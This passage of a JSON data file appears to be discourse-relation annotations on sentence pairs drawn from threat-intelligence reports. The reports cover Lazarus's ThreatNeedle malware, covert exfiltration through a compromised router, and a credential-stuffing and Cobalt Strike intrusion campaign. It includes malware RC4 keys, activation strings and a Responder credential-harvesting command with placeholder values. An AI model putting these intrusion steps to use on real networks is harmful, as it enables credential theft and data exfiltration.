    },
    {
        "S1": "The actor uses it to carry out initial reconnaissance and deploy additional malware for lateral movement.",
        "S2": "When moving laterally, the actor uses ThreatNeedle installer-type malware in the process.",
        "relation": "NEXT"
    },
    {
        "S1": "When moving laterally, the actor uses ThreatNeedle installer-type malware in the process.",
        "S2": "This installer is responsible for implanting the next stage loader-type malware and registering it for auto-execution in order to achieve persistence.",
        "relation": "NEXT"
    },
    {
        "S1": "This installer is responsible for implanting the next stage loader-type malware and registering it for auto-execution in order to achieve persistence.",
        "S2": "The ThreatNeedle loader-type malware exists in several variations and serves the primary purpose of loading the final stage of the ThreatNeedle malware in-memory.",
        "relation": "NEXT"
    },
    {
        "S1": "The ThreatNeedle loader-type malware exists in several variations and serves the primary purpose of loading the final stage of the ThreatNeedle malware in-memory.",
        "S2": "Upon launch, the malware decrypts an embedded string using RC4 (key: B6 B7 2D 8C 6B 5F 14 DF B1 38 A1 73 89 C1 D2 C4) and compares it to \u201c7486513879852\u201c.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Upon launch, the malware decrypts an embedded string using RC4 (key: B6 B7 2D 8C 6B 5F 14 DF B1 38 A1 73 89 C1 D2 C4) and compares it to \u201c7486513879852\u201c.",
        "S2": "If the user executes this malware without a command line parameter, the malware launches a legitimate calculator carrying a dark icon of the popular Avengers franchise.",
        "relation": "IF_ELSE"
    },
    {
        "S1": "If the user executes this malware without a command line parameter, the malware launches a legitimate calculator carrying a dark icon of the popular Avengers franchise.",
        "S2": "Further into the infection process, the malware chooses a service name randomly from netsvc in order to use it for the payload creation path.",
        "relation": "NEXT"
    },
    {
        "S1": "Further into the infection process, the malware chooses a service name randomly from netsvc in order to use it for the payload creation path.",
        "S2": "The malware then creates a file named bcdbootinfo.tlp in the system folder containing the infection time and the random service name that is chosen.",
        "relation": "NEXT"
    },
    {
        "S1": "The malware then creates a file named bcdbootinfo.tlp in the system folder containing the infection time and the random service name that is chosen.",
        "S2": "We\u2019ve discovered that the malware operator checks this file to see whether the remote host was infected and, if so, when the infection happened.",
        "relation": "NEXT"
    },
    {
        "S1": "We\u2019ve discovered that the malware operator checks this file to see whether the remote host was infected and, if so, when the infection happened.",
        "S2": "It then decrypts the embedded payload using the RC4 algorithm, saves it to an .xml extension with a randomly created five-character file name in the current directory and then copies it to the system folder with a .sys extension.",
        "relation": "NEXT"
    },
    {
        "S1": "It then decrypts the embedded payload using the RC4 algorithm, saves it to an .xml extension with a randomly created five-character file name in the current directory and then copies it to the system folder with a .sys extension.",
        "S2": "This final payload is the ThreatNeedle loader running in memory.",
        "relation": "NEXT"
    },
    {
        "S1": "This final payload is the ThreatNeedle loader running in memory.",
        "S2": "At this point the loader uses a different RC4 key (3D 68 D0 0A B1 0E C6 AF DD EE 18 8E F4 A1 D6 20), and the dropped malware is registered as a Windows service and launched.",
        "relation": "NEXT"
    },
    {
        "S1": "At this point the loader uses a different RC4 key (3D 68 D0 0A B1 0E C6 AF DD EE 18 8E F4 A1 D6 20), and the dropped malware is registered as a Windows service and launched.",
        "S2": "In addition, the malware saves the configuration data as a registry key encrypted in RC4:",
        "relation": "NEXT"
    },
    {
        "S1": "In addition, the malware saves the configuration data as a registry key encrypted in RC4:",
        "S2": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\GameConfig \u2013 Description",
        "relation": "ELABORATION"
    },
    {
        "S1": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\GameConfig \u2013 Description",
        "S2": "This component is responsible for loading the final backdoor payload into memory.",
        "relation": "MISC"
    },
    {
        "S1": "This component is responsible for loading the final backdoor payload into memory.",
        "S2": "In order to do this, the malware uses several techniques to decrypt its payload:",
        "relation": "ELABORATION"
    },
    {
        "S1": "In order to do this, the malware uses several techniques to decrypt its payload:",
        "S2": "- Loading the payload from the registry.",
        "relation": "ELABORATION"
    },
    {
        "S1": "- Loading the payload from the registry.",
        "S2": "- Loading the payload from itself after decrypting RC4 and decompression.",
        "relation": "LIST"
    },
    {
        "S1": "- Loading the payload from itself after decrypting RC4 and decompression.",
        "S2": "- Loading the payload from itself after decrypting AES and decompression.",
        "relation": "LIST"
    },
    {
        "S1": "- Loading the payload from itself after decrypting AES and decompression.",
        "S2": "- Loading the payload from itself after decompression.",
        "relation": "LIST"
    },
    {
        "S1": "- Loading the payload from itself after decompression.",
        "S2": "- Loading the payload from itself after one-byte XORing.",
        "relation": "LIST"
    },
    {
        "S1": "- Loading the payload from itself after one-byte XORing.",
        "S2": "Most loader-style malware types check the command line parameter and only proceed with the malicious routine if an expected parameter is given.",
        "relation": "MISC"
    },
    {
        "S1": "Most loader-style malware types check the command line parameter and only proceed with the malicious routine if an expected parameter is given.",
        "S2": "This is a common trait in ThreatNeedle loaders.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This is a common trait in ThreatNeedle loaders.",
        "S2": "The most common example we\u2019ve seen is similar to the ThreatNeedle installer \u2013 the malware decrypts an embedded string using RC4, and compares it with the parameter \u201cSx6BrUk4v4rqBFBV\u201d upon launch.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The most common example we\u2019ve seen is similar to the ThreatNeedle installer \u2013 the malware decrypts an embedded string using RC4, and compares it with the parameter \u201cSx6BrUk4v4rqBFBV\u201d upon launch.",
        "S2": "If it matches, the malware begins decrypting its embedded payload using the same RC4 key.",
        "relation": "IF_ELSE"
    },
    {
        "S1": "If it matches, the malware begins decrypting its embedded payload using the same RC4 key.",
        "S2": "The decrypted payload is an archive file which is subsequently decompressed in the process.",
        "relation": "NEXT"
    },
    {
        "S1": "The decrypted payload is an archive file which is subsequently decompressed in the process.",
        "S2": "Eventually, the ThreatNeedle malware spawns in memory.",
        "relation": "NEXT"
    },
    {
        "S1": "Eventually, the ThreatNeedle malware spawns in memory.",
        "S2": "The other variant of the loader is preparing the next stage payload from the victim\u2019s registry.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The other variant of the loader is preparing the next stage payload from the victim\u2019s registry.",
        "S2": "As we can see from the installer malware description, we suspect that the registry key was created by the installer component.",
        "relation": "ELABORATION"
    },
    {
        "S1": "As we can see from the installer malware description, we suspect that the registry key was created by the installer component.",
        "S2": "Retrieved data from the registry is decrypted using RC4 and then decompressed.",
        "relation": "NEXT"
    },
    {
        "S1": "Retrieved data from the registry is decrypted using RC4 and then decompressed.",
        "S2": "Eventually, it gets loaded into memory and the export function is invoked.",
        "relation": "NEXT"
    },
    {
        "S1": "Eventually, it gets loaded into memory and the export function is invoked.",
        "S2": "The final payload executed in memory is the actual ThreatNeedle backdoor.",
        "relation": "NEXT"
    },
    {
        "S1": "The final payload executed in memory is the actual ThreatNeedle backdoor.",
        "S2": "It has the following functionality to control infected victim machines:",
        "relation": "ELABORATION"
    },
    {
        "S1": "It has the following functionality to control infected victim machines:",
        "S2": "- Manipulate files/directories",
        "relation": "ELABORATION"
    },
    {
        "S1": "- Manipulate files/directories",
        "S2": "- System profiling",
        "relation": "LIST"
    },
    {
        "S1": "- System profiling",
        "S2": "- Control backdoor processes",
        "relation": "LIST"
    },
    {
        "S1": "- Control backdoor processes",
        "S2": "- Enter sleeping or hibernation mode",
        "relation": "LIST"
    },
    {
        "S1": "- Enter sleeping or hibernation mode",
        "S2": "- Update backdoor configuration",
        "relation": "LIST"
    },
    {
        "S1": "- Update backdoor configuration",
        "S2": "- Execute received commands",
        "relation": "LIST"
    },
    {
        "S1": "- Execute received commands",
        "S2": "From one of the hosts, we discovered that the actor executed a credential harvesting tool named Responder and moved laterally using Windows commands.",
        "relation": "MISC"
    },
    {
        "S1": "From one of the hosts, we discovered that the actor executed a credential harvesting tool named Responder and moved laterally using Windows commands.",
        "S2": "Lazarus overcame network segmentation, exfiltrating data from a completely isolated network segment cut off from the internet by compromising a router virtual machine, as we explain below under \u201cOvercoming network segmentation\u201c.",
        "relation": "NEXT"
    },
    {
        "S1": "Lazarus overcame network segmentation, exfiltrating data from a completely isolated network segment cut off from the internet by compromising a router virtual machine, as we explain below under \u201cOvercoming network segmentation\u201c.",
        "S2": "Judging by the hosts that were infected with the ThreatNeedle backdoors post-exploitation, we speculate that the primary intention of this attack is to steal intellectual property.",
        "relation": "MISC"
    },
    {
        "S1": "Judging by the hosts that were infected with the ThreatNeedle backdoors post-exploitation, we speculate that the primary intention of this attack is to steal intellectual property.",
        "S2": "Lastly, the stolen data gets exfiltrated using a custom tool that will be described in the \u201cExfiltration\u201d section.",
        "relation": "NEXT"
    },
    {
        "S1": "Lastly, the stolen data gets exfiltrated using a custom tool that will be described in the \u201cExfiltration\u201d section.",
        "S2": "Below is a rough timeline of the compromise we investigated:",
        "relation": "MISC"
    },
    {
        "S1": "Below is a rough timeline of the compromise we investigated:",
        "S2": "During the investigation we discovered that the Responder tool was executed from one of the victim machines that had received the spear-phishing document.",
        "relation": "MISC"
    },
    {
        "S1": "During the investigation we discovered that the Responder tool was executed from one of the victim machines that had received the spear-phishing document.",
        "S2": "One day after the initial infection, the malware operator placed the tool onto this host and executed it using the following command:",
        "relation": "NEXT"
    },
    {
        "S1": "One day after the initial infection, the malware operator placed the tool onto this host and executed it using the following command:",
        "S2": "[Responder file path] -i [IP address] -rPv",
        "relation": "ELABORATION"
    },
    {
        "S1": "[Responder file path] -i [IP address] -rPv",
        "S2": "Several days later, the attacker started to move laterally originating from this host.",
        "relation": "MISC"
    },
    {
        "S1": "Several days later, the attacker started to move laterally originating from this host.",
        "S2": "Therefore, we assess that the attacker succeeded in acquiring login credentials from this host and started using them for further malicious activity.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Therefore, we assess that the attacker succeeded in acquiring login credentials from this host and started using them for further malicious activity.",
        "S2": "After acquiring the login credentials, the actor started to move laterally from workstations to server hosts.",
        "relation": "NEXT"
    },
    {
        "S1": "After acquiring the login credentials, the actor started to move laterally from workstations to server hosts.",
        "S2": "Typical lateral movement methods were employed, using Windows commands.",
        "relation": "NEXT"
    },
    {
        "S1": "Typical lateral movement methods were employed, using Windows commands.",
        "S2": "First, a network connection with a remote host was established using the command \u201cnet use\u201d.",
        "relation": "ELABORATION"
    },
    {
        "S1": "First, a network connection with a remote host was established using the command \u201cnet use\u201d.",
        "S2": "Next, the actor copied malware to the remote host using the Windows Management Instrumentation Command-line (WMIC).",
        "relation": "NEXT"
    },
    {
        "S1": "Next, the actor copied malware to the remote host using the Windows Management Instrumentation Command-line (WMIC).",
        "S2": "In the course of this research, we identified another highly interesting technique used by the attackers for lateral movement and exfiltration of stolen data.",
        "relation": "ELABORATION"
    },
    {
        "S1": "In the course of this research, we identified another highly interesting technique used by the attackers for lateral movement and exfiltration of stolen data.",
        "S2": "The enterprise network under attack was divided into two segments: corporate (a network on which computers had internet access) and restricted (a network on which computers hosted sensitive data and had no internet access).",
        "relation": "ELABORATION"
    },
    {
        "S1": "The enterprise network under attack was divided into two segments: corporate (a network on which computers had internet access) and restricted (a network on which computers hosted sensitive data and had no internet access).",
        "S2": "According to corporate policies, no transfer of information was allowed between these two segments.",
        "relation": "ELABORATION"
    },
    {
        "S1": "According to corporate policies, no transfer of information was allowed between these two segments.",
        "S2": "In other words, the two segments were meant to be completely separated.",
        "relation": "ELABORATION"
    },
    {
        "S1": "In other words, the two segments were meant to be completely separated.",
        "S2": "Initially, the attackers were able to get access to systems with internet access and spent a long time distributing malware between machines in the network\u2019s corporate segment.",
        "relation": "MISC"
    },
    {
        "S1": "Initially, the attackers were able to get access to systems with internet access and spent a long time distributing malware between machines in the network\u2019s corporate segment.",
        "S2": "Among the compromised machines were those used by the administrators of the enterprise\u2019s IT infrastructure.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Among the compromised machines were those used by the administrators of the enterprise\u2019s IT infrastructure.",
        "S2": "It is worth noting that the administrators could connect both to the corporate and the restricted network segments to maintain systems and provide users with technical support in both zones.",
        "relation": "ELABORATION"
    },
    {
        "S1": "It is worth noting that the administrators could connect both to the corporate and the restricted network segments to maintain systems and provide users with technical support in both zones.",
        "S2": "As a result, by gaining control of administrator workstations the attackers were able to access the restricted network segment.",
        "relation": "ELABORATION"
    },
    {
        "S1": "As a result, by gaining control of administrator workstations the attackers were able to access the restricted network segment.",
        "S2": "However, since directly routing traffic between the segments was not possible, the attackers couldn\u2019t use their standard malware set to exfiltrate data from the restricted segment to the C2.",
        "relation": "MISC"
    },
    {
        "S1": "However, since directly routing traffic between the segments was not possible, the attackers couldn\u2019t use their standard malware set to exfiltrate data from the restricted segment to the C2.",
        "S2": "The situation changed on July 2 when the attackers managed to obtain the credentials for the router used by the administrators to connect to systems in both segments.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The situation changed on July 2 when the attackers managed to obtain the credentials for the router used by the administrators to connect to systems in both segments.",
        "S2": "The router was a virtual machine running CentOS to route traffic between several network interfaces based on predefined rules.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The router was a virtual machine running CentOS to route traffic between several network interfaces based on predefined rules.",
        "S2": "According to the evidence collected, the attackers scanned the router\u2019s ports and detected a Webmin interface.",
        "relation": "ELABORATION"
    },
    {
        "S1": "According to the evidence collected, the attackers scanned the router\u2019s ports and detected a Webmin interface.",
        "S2": "Next, the attackers logged in to the web interface using a privileged root account.",
        "relation": "NEXT"
    },
    {
        "S1": "Next, the attackers logged in to the web interface using a privileged root account.",
        "S2": "It\u2019s unknown how the attackers were able to obtain the credentials for that account, but it\u2019s possible the credentials were saved in one of the infected system\u2019s browser password managers.",
        "relation": "ELABORATION"
    },
    {
        "S1": "It\u2019s unknown how the attackers were able to obtain the credentials for that account, but it\u2019s possible the credentials were saved in one of the infected system\u2019s browser password managers.",
        "S2": "By gaining access to the configuration panel the attackers configured the Apache web server and started using the router as a proxy server between the organization\u2019s corporate and restricted segments.",
        "relation": "NEXT"
    },
    {
        "S1": "By gaining access to the configuration panel the attackers configured the Apache web server and started using the router as a proxy server between the organization\u2019s corporate and restricted segments.",
        "S2": "Several days after that, on July 10, 2020, the attackers connected to the router via SSH and set up the PuTTy PSCP (the PuTTY Secure Copy client) utility on one of the infected machines.",
        "relation": "NEXT"
    },
    {
        "S1": "Several days after that, on July 10, 2020, the attackers connected to the router via SSH and set up the PuTTy PSCP (the PuTTY Secure Copy client) utility on one of the infected machines.",
        "S2": "This utility was used to upload malware to the router VM.",
        "relation": "NEXT"
    },
    {
        "S1": "This utility was used to upload malware to the router VM.",
        "S2": "This enabled the attackers to place malware onto systems in the restricted segment of the enterprise network, using the router to host the samples.",
        "relation": "NEXT"
    },
    {
        "S1": "This enabled the attackers to place malware onto systems in the restricted segment of the enterprise network, using the router to host the samples.",
        "S2": "In addition, malware running in the network\u2019s restricted segment was able to exfiltrate the collected data to the command-and-control server via the Apache server set up on the same router.",
        "relation": "NEXT"
    },
    {
        "S1": "In addition, malware running in the network\u2019s restricted segment was able to exfiltrate the collected data to the command-and-control server via the Apache server set up on the same router.",
        "S2": "New connection layout after attacker\u2019s intrusion",
        "relation": "MISC"
    },
    {
        "S1": "New connection layout after attacker\u2019s intrusion",
        "S2": "In the course of the investigation we identified malware samples with the hardcoded URL of the router used as a proxy server.",
        "relation": "MISC"
    },
    {
        "S1": "In the course of the investigation we identified malware samples with the hardcoded URL of the router used as a proxy server.",
        "S2": "Hardcoded proxy address in the malware",
        "relation": "ELABORATION"
    },
    {
        "S1": "Hardcoded proxy address in the malware",
        "S2": "Since the attackers regularly deleted log files from the router, only a handful of commands entered to the command line via SSH could be recovered.",
        "relation": "MISC"
    },
    {
        "S1": "Since the attackers regularly deleted log files from the router, only a handful of commands entered to the command line via SSH could be recovered.",
        "S2": "An analysis of these commands shows that the attackers tried to reconfigure traffic routing using the route command.",
        "relation": "ELABORATION"
    },
    {
        "S1": "An analysis of these commands shows that the attackers tried to reconfigure traffic routing using the route command.",
        "S2": "The attackers also ran the nmap utility on the router VM and scanned ports on systems within the restricted segment of the enterprise network.",
        "relation": "NEXT"
    },
    {
        "S1": "The attackers also ran the nmap utility on the router VM and scanned ports on systems within the restricted segment of the enterprise network.",
        "S2": "On September 27, the attackers started removing all traces of their activity from the router, using the logrotate utility to set up automatic deletion of log files.",
        "relation": "NEXT"
    },
    {
        "S1": "On September 27, the attackers started removing all traces of their activity from the router, using the logrotate utility to set up automatic deletion of log files.",
        "S2": "We observed that the malware operator attempted to create SSH tunnels to a remote server located in South Korea from several compromised server hosts.",
        "relation": "NEXT"
    },
    {
        "S1": "We observed that the malware operator attempted to create SSH tunnels to a remote server located in South Korea from several compromised server hosts.",
        "S2": "They used a custom tunneling tool to achieve this.",
        "relation": "ELABORATION"
    },
    {
        "S1": "They used a custom tunneling tool to achieve this.",
        "S2": "The tool receives four parameters: client IP address, client port, server IP address and server port.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The tool receives four parameters: client IP address, client port, server IP address and server port.",
        "S2": "The tool offers basic functionality, forwarding client traffic to the server.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The tool offers basic functionality, forwarding client traffic to the server.",
        "S2": "In order to create a covert channel, the malware encrypts forwarded traffic using trivial binary encryption.",
        "relation": "ELABORATION"
    },
    {
        "S1": "In order to create a covert channel, the malware encrypts forwarded traffic using trivial binary encryption.",
        "S2": "Using the covert channel, the adversary copied data from the remote server over to the host using the PuTTy PSCP tool:",
        "relation": "NEXT"
    },
    {
        "S1": "Using the covert channel, the adversary copied data from the remote server over to the host using the PuTTy PSCP tool:",
        "S2": "After copying data from the server, the actor utilized the custom tool to exfiltrate stolen data to the remote server.",
        "relation": "NEXT"
    },
    {
        "S1": "After copying data from the server, the actor utilized the custom tool to exfiltrate stolen data to the remote server.",
        "S2": "This malware looks like a legitimate VNC client and runs like one if it\u2019s executed without any command line parameters.",
        "relation": "MISC"
    },
    {
        "S1": "This malware looks like a legitimate VNC client and runs like one if it\u2019s executed without any command line parameters.",
        "S2": "Execution of malware without parameters",
        "relation": "ELABORATION"
    },
    {
        "S1": "Execution of malware without parameters",
        "S2": "However, if this application is executed with specific command line parameters, it runs an alternate, malicious function.",
        "relation": "ELABORATION"
    },
    {
        "S1": "However, if this application is executed with specific command line parameters, it runs an alternate, malicious function.",
        "S2": "According to our telemetry, the actor executed this application with six parameters:",
        "relation": "ELABORATION"
    },
    {
        "S1": "According to our telemetry, the actor executed this application with six parameters:",
        "S2": "Also, if the number of command line parameters is greater than six, the malware jumps into a malicious routine.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Also, if the number of command line parameters is greater than six, the malware jumps into a malicious routine.",
        "S2": "The malware also checks the length of the second argument \u2013 if it\u2019s less than 29 characters, it terminates the execution.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The malware also checks the length of the second argument \u2013 if it\u2019s less than 29 characters, it terminates the execution.",
        "S2": "When the parameter checking procedure has passed successfully, the malware starts to decrypt its next payload.",
        "relation": "NEXT"
    },
    {
        "S1": "When the parameter checking procedure has passed successfully, the malware starts to decrypt its next payload.",
        "S2": "The embedded payload gets decrypted via XOR, where each byte from the end of the payload gets applied to the preceding byte.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The embedded payload gets decrypted via XOR, where each byte from the end of the payload gets applied to the preceding byte.",
        "S2": "Next, the XORed blob receives the second command line argument that\u2019s provided (in this case S0RMM-50QQE-F65DN-DCPYN-5QEQA).",
        "relation": "NEXT"
    },
    {
        "S1": "Next, the XORed blob receives the second command line argument that\u2019s provided (in this case S0RMM-50QQE-F65DN-DCPYN-5QEQA).",
        "S2": "The malware can accept more command line arguments, and depending on its number it runs differently.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The malware can accept more command line arguments, and depending on its number it runs differently.",
        "S2": "For example, it can also receive proxy server addresses with the \u201c-p\u201d option.",
        "relation": "ELABORATION"
    },
    {
        "S1": "For example, it can also receive proxy server addresses with the \u201c-p\u201d option.",
        "S2": "When the decrypted in-memory payload is executed, it compares the header of the configuration data passed with the string \u201c0x8406\u201d in order to confirm its validity.",
        "relation": "MISC"
    },
    {
        "S1": "When the decrypted in-memory payload is executed, it compares the header of the configuration data passed with the string \u201c0x8406\u201d in order to confirm its validity.",
        "S2": "The payload opens a given file (in this example %APPDATA%\\Comms\\cab59.tmp) and starts exfiltrating it to the remote server.",
        "relation": "NEXT"
    },
    {
        "S1": "The payload opens a given file (in this example %APPDATA%\\Comms\\cab59.tmp) and starts exfiltrating it to the remote server.",
        "S2": "When the malware uploads data to the C2 server, it uses HTTP POST requests with two parameters named \u2018fr\u2019 and \u2018fp\u2019:",
        "relation": "NEXT"
    },
    {
        "S1": "In all the intrusions we have observed they are performed in similar ways by the adversary: from initial access all the way to actions on objectives.",
        "S2": "The objective in these cases appear to be stealing sensitive data from the victim\u2019s networks.",
        "relation": "NEXT"
    },
    {
        "S1": "The objective in these cases appear to be stealing sensitive data from the victim\u2019s networks.",
        "S2": "This adversary starts with obtaining usernames and passwords of their victim from previous breaches.",
        "relation": "MISC"
    },
    {
        "S1": "This adversary starts with obtaining usernames and passwords of their victim from previous breaches.",
        "S2": "These credentials are used in a credential stuffing or password spraying attack against the victim\u2019s remote services, such as webmail or other internet reachable mail services.",
        "relation": "NEXT"
    },
    {
        "S1": "These credentials are used in a credential stuffing or password spraying attack against the victim\u2019s remote services, such as webmail or other internet reachable mail services.",
        "S2": "After obtaining a valid account, they use this account to access the victim\u2019s VPN, Citrix or another remote service that allows access to the network of the victim.",
        "relation": "NEXT"
    },
    {
        "S1": "After obtaining a valid account, they use this account to access the victim\u2019s VPN, Citrix or another remote service that allows access to the network of the victim.",
        "S2": "Information regarding these remotes services is taken from the mailbox, cloud drive, or other cloud resources accessible by the compromised account.",
        "relation": "NEXT"
    },
    {
        "S1": "Information regarding these remotes services is taken from the mailbox, cloud drive, or other cloud resources accessible by the compromised account.",
        "S2": "As soon as they have a foothold on a system (also known as patient zero or index case), they check the permissions of the account on that system, and attempt to obtain a list of accounts with administrator privileges.",
        "relation": "NEXT"
    },
    {
        "S1": "As soon as they have a foothold on a system (also known as patient zero or index case), they check the permissions of the account on that system, and attempt to obtain a list of accounts with administrator privileges.",
        "S2": "With this list of administrator-accounts, the adversary performs another password spraying attack until a valid admin account is compromised.",
        "relation": "NEXT"
    },
    {
        "S1": "With this list of administrator-accounts, the adversary performs another password spraying attack until a valid admin account is compromised.",
        "S2": "With this valid admin account, a Cobalt Strike beacon is loaded into memory of patient zero.",
        "relation": "NEXT"
    },
    {
        "S1": "With this valid admin account, a Cobalt Strike beacon is loaded into memory of patient zero.",
        "S2": "From here on the adversary stops using the victim\u2019s remote service to access the victim\u2019s network, and starts using the Cobalt Strike beacon for remote access and command and control.",
        "relation": "NEXT"
    },
    {
        "S1": "From here on the adversary stops using the victim\u2019s remote service to access the victim\u2019s network, and starts using the Cobalt Strike beacon for remote access and command and control.",
        "S2": "The adversary continues their discovery of the victim\u2019s network from patient zero.",
        "relation": "NEXT"
    },
    {
        "S1": "The adversary continues their discovery of the victim\u2019s network from patient zero.",
        "S2": "Various scans and queries are used to find proxy settings, domain controllers, remote desktop services, Citrix services, and network shares.",
        "relation": "NEXT"
    },
    {
        "S1": "Various scans and queries are used to find proxy settings, domain controllers, remote desktop services, Citrix services, and network shares.",
        "S2": "If the obtained valid account is already member of the domain admins group, the first lateral move in the network is usually to a domain controller where the adversary also deploys a Cobalt Strike beacon.",
        "relation": "IF_ELSE"
    },
    {
        "S1": "If the obtained valid account is already member of the domain admins group, the first lateral move in the network is usually to a domain controller where the adversary also deploys a Cobalt Strike beacon.",
        "S2": "Otherwise, a jump host or other system likely used by domain admins is found and equipped with a Cobalt Strike beacon.",
        "relation": "IF_ELSE"
    },
    {
        "S1": "Otherwise, a jump host or other system likely used by domain admins is found and equipped with a Cobalt Strike beacon.",
        "S2": "After this the adversary dumps the domain admin credentials from the memory of this machine, continues lateral moving through the network, and places Cobalt Strike beacons on servers for increased persistent access into the victim\u2019s network.",
        "relation": "NEXT"
    },
    {
        "S1": "After this the adversary dumps the domain admin credentials from the memory of this machine, continues lateral moving through the network, and places Cobalt Strike beacons on servers for increased persistent access into the victim\u2019s network.",
        "S2": "If the victim\u2019s network contains other Windows domains or different network security zones, the adversary scans and finds the trust relationships and jump hosts, attempting to move into the other domains and security zones.",
        "relation": "NEXT"
    },
    {
        "S1": "If the victim\u2019s network contains other Windows domains or different network security zones, the adversary scans and finds the trust relationships and jump hosts, attempting to move into the other domains and security zones.",
        "S2": "The adversary is typically able to perform all the steps described above within one day.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The adversary is typically able to perform all the steps described above within one day.",
        "S2": "During this process, the adversary identifies data of interest from the network of the victim.",
        "relation": "ELABORATION"
    },
    {
        "S1": "During this process, the adversary identifies data of interest from the network of the victim.",
        "S2": "This can be anything from file and directory-listings, configuration files, manuals, email stores in the guise of OST- and PST-files, file shares with intellectual property (IP), and data scraped from memory.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This can be anything from file and directory-listings, configuration files, manuals, email stores in the guise of OST- and PST-files, file shares with intellectual property (IP), and data scraped from memory.",
        "S2": "If the data is small enough, it is exfiltrated through the command and control channel of the Cobalt Strike beacons.",
        "relation": "IF_ELSE"
    },
    {
        "S1": "If the data is small enough, it is exfiltrated through the command and control channel of the Cobalt Strike beacons.",
        "S2": "However, usually the data is compressed with WinRAR, staged on another system of the victim, and from there copied to a OneDrive-account controlled by the adversary.",
        "relation": "NEXT"
    },
    {
        "S1": "However, usually the data is compressed with WinRAR, staged on another system of the victim, and from there copied to a OneDrive-account controlled by the adversary.",
        "S2": "After the adversary completes their initial exfiltration, they return every few weeks to check for new data of interest and user accounts.",
        "relation": "NEXT"
    },
    {
        "S1": "After the adversary completes their initial exfiltration, they return every few weeks to check for new data of interest and user accounts.",
        "S2": "At times they have been observed attempting to perform a degree of anti-forensic activities including clearing event logs, time stomping files, and removing scheduled tasks created for some objectives.",
        "relation": "ELABORATION"
    },
    {
        "S1": "At times they have been observed attempting to perform a degree of anti-forensic activities including clearing event logs, time stomping files, and removing scheduled tasks created for some objectives.",
        "S2": "But this isn\u2019t done consistently across their engagements.",
        "relation": "ELABORATION"
    },
    {
        "S1": "But this isn\u2019t done consistently across their engagements.",
        "S2": "The earliest and longest lasting intrusion by this threat we observed, was at a company in the semiconductors industry in Europe and started early Q4 2017.",
        "relation": "MISC"
    },
    {
        "S1": "The earliest and longest lasting intrusion by this threat we observed, was at a company in the semiconductors industry in Europe and started early Q4 2017.",
        "S2": "The more recent intrusions took place in 2019 at companies in the aviation industry.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The more recent intrusions took place in 2019 at companies in the aviation industry.",
        "S2": "The techniques used to achieve access at the companies in the aviation industry closely resembles techniques used at victims in the semiconductors industry.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The techniques used to achieve access at the companies in the aviation industry closely resembles techniques used at victims in the semiconductors industry.",
        "S2": "The threat used valid accounts against remote services: Cloud-based applications utilizing federated authentication protocols.",
        "relation": "MISC"
    },
    {
        "S1": "The threat used valid accounts against remote services: Cloud-based applications utilizing federated authentication protocols.",
        "S2": "Our incident responders analysed the credentials used by the adversary and the traces of the intrusion in log files.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Our incident responders analysed the credentials used by the adversary and the traces of the intrusion in log files.",
        "S2": "They uncovered an obvious overlap in the credentials used by this threat and the presence of those same accounts in previously breached databases.",
        "relation": "ELABORATION"
    },
    {
        "S1": "They uncovered an obvious overlap in the credentials used by this threat and the presence of those same accounts in previously breached databases.",
        "S2": "Besides that, the traces in log files showed more than usual login attempts with a username formatted as email address, e.g.<username>@<email domain>.",
        "relation": "NEXT"
    },
    {
        "S1": "Besides that, the traces in log files showed more than usual login attempts with a username formatted as email address, e.g.<username>@<email domain>.",
        "S2": "While usernames for legitimate logins at the victim\u2019s network were generally formatted like <domain><username>.",
        "relation": "ELABORATION"
    },
    {
        "S1": "While usernames for legitimate logins at the victim\u2019s network were generally formatted like <domain><username>.",
        "S2": "And attempted logins came from a relative small set of IP-addresses.",
        "relation": "ELABORATION"
    },
    {
        "S1": "And attempted logins came from a relative small set of IP-addresses.",
        "S2": "For the investigators at NCC Group and Fox-IT these pieces of evidence supported the hypothesis of the adversary achieving credentials access by brute force, and more specifically by credential stuffing or password spraying.",
        "relation": "ELABORATION"
    },
    {
        "S1": "For the investigators at NCC Group and Fox-IT these pieces of evidence supported the hypothesis of the adversary achieving credentials access by brute force, and more specifically by credential stuffing or password spraying.",
        "S2": "In some of the intrusions the adversary used the valid account to directly login to a Citrix environment and continued their work from there.",
        "relation": "ELABORATION"
    },
    {
        "S1": "In some of the intrusions the adversary used the valid account to directly login to a Citrix environment and continued their work from there.",
        "S2": "In one specific case, the adversary now armed with the valid account, was able to access a document stored in SharePoint Online, part of Microsoft Office 365.",
        "relation": "ELABORATION"
    },
    {
        "S1": "In one specific case, the adversary now armed with the valid account, was able to access a document stored in SharePoint Online, part of Microsoft Office 365.",
        "S2": "This specific document described how to access the internet facing company portal and the web-based VPN client into the company network.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This specific document described how to access the internet facing company portal and the web-based VPN client into the company network.",
        "S2": "Within an hour after grabbing this document, the adversary accessed the company portal with the valid account.",
        "relation": "MISC"
    },
    {
        "S1": "Within an hour after grabbing this document, the adversary accessed the company portal with the valid account.",
        "S2": "From this portal it was possible to launch the web-based VPN.",
        "relation": "NEXT"
    },
    {
        "S1": "From this portal it was possible to launch the web-based VPN.",
        "S2": "The VPN was protected by two-factor authentication (2FA) by sending an SMS with a one-time password (OTP) to the user account\u2019s primary or alternate phone number.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The VPN was protected by two-factor authentication (2FA) by sending an SMS with a one-time password (OTP) to the user account\u2019s primary or alternate phone number.",
        "S2": "It was possible to configure an alternate phone number for the logged in user account at the company portal.",
        "relation": "ELABORATION"
    },
    {
